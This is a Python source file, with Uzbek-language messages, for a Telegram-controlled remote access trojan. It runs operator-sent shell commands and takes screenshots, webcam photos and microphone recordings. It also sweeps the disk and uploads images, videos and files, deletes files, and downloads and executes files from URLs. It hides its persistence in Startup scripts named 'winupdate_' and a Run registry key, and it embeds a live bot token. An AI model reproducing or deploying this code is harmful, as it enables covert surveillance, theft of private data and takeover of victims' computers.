import telebot
import os
import platform
import subprocess
import psutil
import datetime
import sys
import uuid
import time
from threading import Thread
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

# === CONFIG ===
TOKEN = '7417648281:AAH9y9eRBzOZdkWV7fWvfR9EQtaFuIAtnYA'
AUTHORIZED_USER_ID = 5270162682
bot = telebot.TeleBot(TOKEN)
DOWNLOAD_FOLDER = 'downloads'
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)


# === TEMP AUTH ===
temporary_authorized_until = 0
def is_temporarily_authorized():
    return time.time() < temporary_authorized_until
def grant_temporary_access(minutes):
    global temporary_authorized_until
    temporary_authorized_until = time.time() + (minutes * 60)

def restricted(func):
    def wrapper(message, *args, **kwargs):
        if message.from_user.id != AUTHORIZED_USER_ID:
            bot.send_message(message.chat.id, "⛔ Kirish mumkin emas.")
            return
        return func(message, *args, **kwargs)
    return wrapper

#-----------------------------------------------/sms---------------------------------------------------
@bot.message_handler(commands=['sms'])
@restricted
def send_custom_message(message):
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.send_message(message.chat.id, "Foydalanish: /sms <chat_id> <xabar matni>")
            return
        chat_id = int(parts[1])
        msg_text = parts[2]
        bot.send_message(chat_id, msg_text)
        bot.send_message(message.chat.id, f"✅ Xabar {chat_id} ga yuborildi.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Xatolik: {e}")



#-----------------------------------------------/admin--------------------------------------------------
@bot.message_handler(commands=['admin'])
def handle_admin(message):
    try:
        parts = message.text.strip().split()
        if len(parts) != 2:
            bot.send_message(message.chat.id, "❗ Foydalanish: /admin huquqi senga berilmaydi")
            return
        minutes = int(parts[1])
        if minutes <= 0 and minutes > 1440:
            bot.send_message(message.chat.id, "❗ Daqiqa 1–1440 oralig‘ida bo‘lishi kerak.")
            return
        grant_temporary_access(minutes)
        bot.send_message(message.chat.id, f"✅ {minutes} daqiqa davomida foydalanishga ruxsat beraman.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#-----------------------------------RESTRICTED DECORATOR--------------------------------------------------
def restricted(func):
    def wrapper(message):
        if message.from_user.id != AUTHORIZED_USER_ID and not is_temporarily_authorized():
            bot.send_message(message.chat.id, "🚫 Ruxsat yo‘q.")
            return
        return func(message)
    return wrapper


#-----------------------------------------/screenshot-----------------------------------------------------
@bot.message_handler(commands=['screenshot'])
@restricted
def screenshot(message):
    if ImageGrab is None:
        bot.send_message(message.chat.id, "PIL o‘rnatilmagan, pip install pillow ni bajaring.")
        return
    try:
        img = ImageGrab.grab()
        filename = f"screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        path = os.path.join(DOWNLOAD_FOLDER, filename)
        img.save(path)
        with open(path, 'rb') as f:
            bot.send_photo(message.chat.id, f)
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#-----------------------------------------------/scanfiles-----------------------------------------------
@bot.message_handler(commands=['scanfiles'])
@restricted
def scan_files(message):
    try:
        root_path = 'C:\\' if platform.system() == 'Windows' else '/'
        files_found = []
        max_files = 100
        for dirpath, dirnames, filenames in os.walk(root_path):
            for file in filenames:
                files_found.append(os.path.join(dirpath, file))
                if len(files_found) >= max_files:
                    break
            if len(files_found) >= max_files:
                break
        reply = "\n".join(files_found[:100]) if files_found else "Fayl topilmadi."
        bot.send_message(message.chat.id, f"Topilgan fayllar:\n{reply}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#---------------------------------------------/processes--------------------------------------------------
@bot.message_handler(commands=['processes'])
@restricted
def list_processes(message):
    try:
        procs = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            procs.append(f"PID:{proc.info['pid']} Nomi:{proc.info['name']} Foydalanuvchi:{proc.info['username']}")
        reply = "\n".join(procs[:50])
        bot.send_message(message.chat.id, f"Jarayonlar:\n{reply}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#------------------------------------------------/img------------------------------------------------------
@bot.message_handler(commands=['img'])
@restricted
def send_images_or_capture(message):
    import time
    try:
        parts = message.text.split()
        if len(parts) != 2 and not parts[1].isdigit():
            bot.send_message(message.chat.id, "Foydalanish: /img dan foydalanish mumkin emas")
            return
        count = int(parts[1])
        image_extensions = ('.jpg', '.jpeg', '.png', '.bmp', '.gif')
        root_path = 'C:\\' if platform.system() == 'Windows' else '/'
        found = []
        for dirpath, _, filenames in os.walk(root_path):
            for file in filenames:
                if file.lower().endswith(image_extensions):
                    full_path = os.path.join(dirpath, file)
                    found.append(full_path)
                    if len(found) >= count:
                        break
            if len(found) >= count:
                break
        if found:
            bot.send_message(message.chat.id, f"🖼 {len(found)} ta rasm topildi va yuborilmoqda...")
            for path in found:
                try:
                    with open(path, 'rb') as f:
                        bot.send_photo(message.chat.id, f, caption=os.path.basename(path))
                except Exception as e:
                    bot.send_message(message.chat.id, f"⚠️ {path} yuborilmadi: {e}")
        else:
            bot.send_message(message.chat.id, f"🧐 Rasm topilmadi. 📷 Kamera orqali {count} soniya ichida suratga olinmoqda...")
            if platform.system() == 'Windows':
                try:
                    import cv2
                    cap = cv2.VideoCapture(0)
                    if not cap.isOpened():
                        bot.send_message(message.chat.id, "❌ Kamera ochilmadi.")
                        return
                    ret, frame = cap.read()
                    if ret:
                        filename = os.path.join(DOWNLOAD_FOLDER, f"captured_{int(time.time())}.jpg")
                        cv2.imwrite(filename, frame)
                        with open(filename, 'rb') as f:
                            bot.send_photo(message.chat.id, f, caption="📸 Kamera orqali olingan surat")
                    else:
                        bot.send_message(message.chat.id, "❌ Suratga olishda xatolik yuz berdi.")
                    cap.release()
                    cv2.destroyAllWindows()
                except Exception as e:
                    bot.send_message(message.chat.id, f"Kamera xatosi: {e}")
            else:
                bot.send_message(message.chat.id, "Kamera faqat Windows platformada qo‘llab-quvvatlanadi.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#---------------------------------------------/list-------------------------------------------------------
@bot.message_handler(commands=['list'])
@restricted
def list_files(message):
    try:
        files = os.listdir('.')
        bot.send_message(message.chat.id, "\n".join(files))
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#----------------------------------------------/send------------------------------------------------------
@bot.message_handler(commands=['send'])
@restricted
def send_file(message):
    try:
        _, filename = message.text.split(maxsplit=1)
        with open(filename, 'rb') as f:
            bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.send_message(message.chat.id, f"Xato: {e}")


#-----------------------------------------/document--------------------------------------------------------
@bot.message_handler(content_types=['document'])
@restricted
def receive_file(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        path = os.path.join(DOWNLOAD_FOLDER, message.document.file_name)
        with open(path, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.send_message(message.chat.id, f"{message.document.file_name} saqlandi.")
        if platform.system() == 'Windows':
            autorun_register(os.path.abspath(path))
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#-------------------------------------------/delete----------------------------------------------------------
@bot.message_handler(commands=['delete'])
@restricted
def delete_file(message):
    try:
        _, filename = message.text.split(maxsplit=1)
        os.remove(filename)
        bot.send_message(message.chat.id, f"{filename} o‘chirildi.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#---------------------------------------------/download-----------------------------------------------------
@bot.message_handler(commands=['download'])
@restricted
def download_file(message):
    try:
        _, filepath = message.text.split(maxsplit=1)
        if not os.path.isfile(filepath):
            bot.send_message(message.chat.id, "Fayl topilmadi.")
            return
        with open(filepath, 'rb') as f:
            bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.send_message(message.chat.id, f"Xato: {e}")


#--------------------------------------------/cmd--------------------------------------------------------
@bot.message_handler(commands=['cmd'])
@restricted
def run_command(message):
    try:
        command = message.text[5:]
        if platform.system() == 'Windows':
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        else:
            result = subprocess.getoutput(command)
        bot.send_message(message.chat.id, result[:4000])
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#--------------------------------------------/search-----------------------------------------------------
@bot.message_handler(commands=['search'])
@restricted
def search_file(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Fayl nomini kiriting: /search file.txt")
            return
        filename_to_find = parts[1].strip()
        root_path = 'C:\\' if platform.system() == 'Windows' else '/'
        matches = []
        for dirpath, _, filenames in os.walk(root_path):
            for file in filenames:
                if file == filename_to_find:
                    full_path = os.path.join(dirpath, file)
                    matches.append(full_path)
                    if len(matches) >= 10:
                        break
            if len(matches) >= 10:
                break
        if matches:
            result = "\n".join(matches)
            bot.send_message(message.chat.id, f"Topildi:\n{result}")
        else:
            bot.send_message(message.chat.id, "Topilmadi.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")
#------------------------------------------ /img_all ----------------------------------------------------

@bot.message_handler(commands=['img_all'])
@restricted
def send_all_images(message):
    try:
        image_extensions = ('.jpg', '.jpeg', '.png', '.bmp', '.gif')
        root_path = 'C:\\' if platform.system() == 'Windows' else '/'
        found = []
        for dirpath, _, filenames in os.walk(root_path):
            for file in filenames:
                if file.lower().endswith(image_extensions):
                    full_path = os.path.join(dirpath, file)
                    found.append(full_path)
        if not found:
            bot.send_message(message.chat.id, "📁 Rasm topilmadi.")
            return
        bot.send_message(message.chat.id, f"🖼 {len(found)} ta rasm topildi. Yuborilmoqda...")
        for path in found[:30]:  # 30 tadan ko‘p yuborilmasin
            try:
                with open(path, 'rb') as f:
                    bot.send_photo(message.chat.id, f, caption=os.path.basename(path))
            except:
                continue
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#--------------------------------------------- /video -----------------------------------------------------
@bot.message_handler(commands=['video'])
@restricted
def send_videos(message):
    try:
        parts = message.text.split()
        if len(parts) != 2 and not parts[1].isdigit():
            bot.send_message(message.chat.id, "Foydalanish: /video <soni>")
            return
        count = int(parts[1])
        video_extensions = ('.mp4', '.avi', '.mov', '.mkv', '.wmv')
        root_path = 'C:\\' if platform.system() == 'Windows' else '/'
        found = []
        for dirpath, _, filenames in os.walk(root_path):
            for file in filenames:
                if file.lower().endswith(video_extensions):
                    full_path = os.path.join(dirpath, file)
                    found.append(full_path)
                    if len(found) >= count:
                        break
            if len(found) >= count:
                break
        if found:
            for path in found:
                try:
                    with open(path, 'rb') as f:
                        bot.send_video(message.chat.id, f, caption=os.path.basename(path))
                except:
                    continue
        else:
            bot.send_message(message.chat.id, "🎥 Video topilmadi.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")

#----------------------------------------------/camera---------------------------------------------------
@bot.message_handler(commands=['camera'])
@restricted
def capture_camera_image(message):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            bot.send_message(message.chat.id, "Kamera ochilmadi.")
            return
        ret, frame = cap.read()
        if ret:
            filename = f"{DOWNLOAD_FOLDER}/cam_{int(time.time())}.jpg"
            cv2.imwrite(filename, frame)
            with open(filename, 'rb') as f:
                bot.send_photo(message.chat.id, f, caption="📸 Kamera orqali olingan")
        else:
            bot.send_message(message.chat.id, "❌ Kamera suratga ola olmadi.")
        cap.release()
        cv2.destroyAllWindows()
    except Exception as e:
        bot.send_message(message.chat.id, f"Xato: {e}")

#---------------------------------------------/download <url>--------------------------------------------

@bot.message_handler(commands=['download_url'])
@restricted
def download_and_run(message):
    import requests
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Foydalanish: /download <url>")
            return
        url = parts[1]
        filename = os.path.join(DOWNLOAD_FOLDER, os.path.basename(url))
        r = requests.get(url)
        with open(filename, 'wb') as f:
            f.write(r.content)
        bot.send_message(message.chat.id, f"📥 Fayl yuklandi: {filename}")
        os.startfile(filename) if platform.system() == 'Windows' else subprocess.Popen(['xdg-open', filename])
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#----------------------------------------------/cd------------------------------------------------------
@bot.message_handler(commands=['cd'])
@restricted
def open_path(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Foydalanish: /cd <path>")
            return
        path = parts[1]
        if not os.path.exists(path):
            bot.send_message(message.chat.id, "❌ Yo‘l mavjud emas.")
            return
        os.startfile(path) if platform.system() == 'Windows' else subprocess.Popen(['xdg-open', path])
        bot.send_message(message.chat.id, f"✅ Ochildi: {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")

#-----------------------------------------------/record------------------------------------------------
@bot.message_handler(commands=['record'])
@restricted
def record_audio(message):
    try:
        import pyaudio
        import wave

        parts = message.text.split()
        if len(parts) != 2 and not parts[1].isdigit():
            bot.send_message(message.chat.id, "Foydalanish: /record <sekund>")
            return

        duration = int(parts[1])
        filename = os.path.join(DOWNLOAD_FOLDER, f"audio_{int(time.time())}.wav")

        bot.send_message(message.chat.id, f"🎤 Yozilmoqda ({duration} sek)...")

        # PyAudio sozlamalari
        chunk = 1024  # Har bir blok o'lchami
        sample_format = pyaudio.paInt16  # 16-bit
        channels = 1  # Mono
        rate = 44100  # 44.1kHz

        p = pyaudio.PyAudio()

        stream = p.open(format=sample_format,
                        channels=channels,
                        rate=rate,
                        input=True,
                        frames_per_buffer=chunk)

        frames = []
        for _ in range(0, int(rate / chunk * duration)):
            data = stream.read(chunk)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        # WAV faylga saqlash
        wf = wave.open(filename, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
        wf.close()

        with open(filename, 'rb') as f:
            bot.send_audio(message.chat.id, f)

    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")


#--------------------------------------------/location--------------------------------------------------
@bot.message_handler(commands=['location'])
@restricted
def send_location(message):
    try:
        import geocoder
        g = geocoder.ip('me')
        if g.ok:
            bot.send_message(message.chat.id, f"🌍 Joylashuv: {g.city}, {g.country} (IP orqali aniqlangan)")
        else:
            bot.send_message(message.chat.id, "❌ Joylashuv aniqlanmadi.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")

#------------------------------------------------/details-----------------------------------------------
@bot.message_handler(commands=['details'])
@restricted
def device_details(message):
    try:
        info = f"""🖥 Tizim:
💻 OS: {platform.system()} {platform.release()}
📌 Platforma: {platform.platform()}
👤 Foydalanuvchi: {os.getlogin()}
🧠 CPU: {platform.processor()}
🕒 Vaqt: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        bot.send_message(message.chat.id, info)
    except Exception as e:
        bot.send_message(message.chat.id, f"Xatolik: {e}")

#----------------------------------------------/help-----------------------------------------------------
@bot.message_handler(commands=['help'])
@restricted
def help_command(message):
    help_text = """
            🛠 Bot Komandalar:

    /admin <daqiqa> – Vaqtinchalik ruxsat
    /cd <path> - Fayl yoki linkni ochish
    /camera - Kameradan surat
    /cmd <buyruq> - Terminal oynadan foydalanish 
    /delete <fayl> – Fayl o‘chirish
    /details - Qurilma haqida
    /download <fayl> – Fayl yuborish
    /download_url <url> - Yuklab olish va ishga tushirish
    /help – Yordam
    /img <son> cha rasm yuboradi agar topa olmasa rasmga oladi
    /img_all - Barcha rasmni yuboradi
    /list – Papkadagi fayllar
    /location - Qurilma joylashuvi
    /processes – Jarayonlar ro‘yxati
    /record <sekund> - Mikrofondan audio yozish
    /scanfiles – Fayllarni qidirish
    /screenshot – Ekran tasviri
    /search <fayl> – Faylni qidirish
    /send <fayl> – Fayl yuborish
    /sms <Chat_id> <sms_text> -----> chat id ga sms yuboradi
    /video <n> - n ta video yuboradi
    

📥 Yuklangan fayllar autorunga qo‘shiladi (Windows)
"""
    bot.send_message(message.chat.id, help_text)


#======================================== AUTORUN FUNKSIYALARI ==============================================
def autorun_register(file_path):
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'MyTelegramRemoteBot', 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
        print(f"Autorun qo‘shildi: {file_path}")
    except Exception as e:
        print(f"Autorun xatolik: {e}")
def protect_file(filepath):
    try:
        subprocess.run(['attrib', '+r', '+s', filepath], shell=True)
        print(f"{filepath} himoyalandi.")
    except Exception as e:
        print(f"Himoyalashda xatolik: {e}")
def autorun_stealth():
    if platform.system() != 'Windows':
        return
    try:
        startup_dir = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
        downloads_dir = os.path.abspath('downloads')
        self_path = os.path.abspath(sys.argv[0])
        self_script_id = "winupdate_" + uuid.uuid4().hex[:6]
        self_vbs_path = os.path.join(startup_dir, f"{self_script_id}.vbs")
        with open(self_vbs_path, 'w') as f:
            f.write('Set WshShell = CreateObject("WScript.Shell")\n')
            f.write(f'WshShell.Run "python \\"{self_path}\\"", 0\n')
        os.system(f'attrib +h "{self_vbs_path}"')
        if os.path.exists(downloads_dir):
            for file in os.listdir(downloads_dir):
                full_path = os.path.join(downloads_dir, file)
                if file.endswith(('.py', '.exe')):
                    script_id = os.path.splitext(file)[0] + "_" + uuid.uuid4().hex[:4]
                    vbs_path = os.path.join(startup_dir, f"{script_id}.vbs")
                    with open(vbs_path, 'w') as f:
                        f.write('Set WshShell = CreateObject("WScript.Shell")\n')
                        if file.endswith('.py'):
                            f.write(f'WshShell.Run "python \\"{full_path}\\"", 0\n')
                        else:
                            f.write(f'WshShell.Run \\"{full_path}\\"", 0\n')
                    os.system(f'attrib +h "{vbs_path}"')
    except Exception as e:
        print(f"Autorun stealth xatolik: {e}")


#*************************************** MAIN **********************************************
if __name__ == "__main__":
    autorun_stealth()
    filepath = os.path.abspath(sys.argv[0])
    protect_file(filepath)
    if platform.system() == 'Windows':
        autorun_register(filepath)
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        bot.send_message(AUTHORIZED_USER_ID, f"🟢 Kompyuter ishga tushdi: {now}")
    except Exception as e:
        print(f"Botga xabar yuborilmadi: {e}")
    print("Bot ishga tushdi...")
    bot.infinity_polling()
